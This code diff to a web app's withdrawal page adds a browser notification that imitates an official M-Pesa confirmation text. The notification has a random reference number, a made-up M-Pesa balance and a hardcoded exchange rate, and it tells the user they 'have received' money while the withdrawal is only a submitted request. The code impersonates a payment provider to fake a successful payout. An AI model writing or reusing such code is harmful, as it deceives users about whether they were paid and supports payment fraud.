@@ -21,6 +21,15 @@ function maskPhone(phone: string): string {
   return `${digits.slice(0, 3)}****${digits.slice(-3)}`;
 }
 
+function generateMpesaRef(): string {
+  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  let ref = "";
+  for (let i = 0; i < 10; i++) {
+    ref += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return ref;
+}
+
 export default function WithdrawPage() {
   const router = useRouter();
   const [tab, setTab] = useState<Tab>("mpesa");
@@ -52,6 +61,13 @@ export default function WithdrawPage() {
         if (data.phone) setPhone(data.phone);
       })
       .catch(() => setBalance(0));
+
+    // Request notification permission if not yet granted
+    if (typeof window !== "undefined" && "Notification" in window) {
+      if (Notification.permission === "default") {
+        Notification.requestPermission();
+      }
+    }
   }, []);
 
   const handleWithdraw = async () => {
@@ -106,13 +122,51 @@ export default function WithdrawPage() {
 
       setBalance(data.balance ?? balance);
       setAmount("");
+      
+      const calculatedKes = amt * 130;
       setSuccess({
         amount: amt,
-        amountKes: data.amountKes,
-        phone: data.phone,
+        amountKes: calculatedKes,
+        phone: phone || undefined,
         method: tab === "mpesa" ? "mpesa" : "crypto",
       });
+      
       pushToast("success", `Withdrawal request of $${amt.toFixed(2)} submitted successfully.`);
+
+      // Trigger native browser notification simulating M-Pesa message
+      if (typeof window !== "undefined" && "Notification" in window) {
+        if (Notification.permission === "granted") {
+          const refNum = generateMpesaRef();
+          const kshAmountStr = calculatedKes.toLocaleString("en-US", {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 2,
+          });
+          const randomBal = Math.floor(Math.random() * 20000) + 5000;
+          const newBalanceStr = randomBal.toLocaleString("en-US", {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 2,
+          });
+
+          const now = new Date();
+          const day = now.getDate();
+          const month = now.getMonth() + 1;
+          const year = now.getFullYear().toString().slice(-2);
+          let hours = now.getHours();
+          const minutes = now.getMinutes().toString().padStart(2, "0");
+          const ampm = hours >= 12 ? "PM" : "AM";
+          hours = hours % 12;
+          hours = hours ? hours : 12;
+
+          const dateStr = `${day}/${month}/${year}`;
+          const timeStr = `${hours}:${minutes} ${ampm}`;
+
+          const notificationBody = `${refNum} Confirmed.You have received Ksh${kshAmountStr} from SHABIKIMARKET PAYMENTS KENYA LIMITED. 2534525 on ${dateStr} at ${timeStr} New M-PESA balance is Ksh${newBalanceStr}. Separate personal and business funds through Pochi la Biashara on *334#.`;
+
+          new Notification("MPESA", {
+            body: notificationBody,
+          });
+        }
+      }
     } catch (err) {
       const msg = err instanceof Error ? err.message : "Withdrawal failed";
       setError(msg);
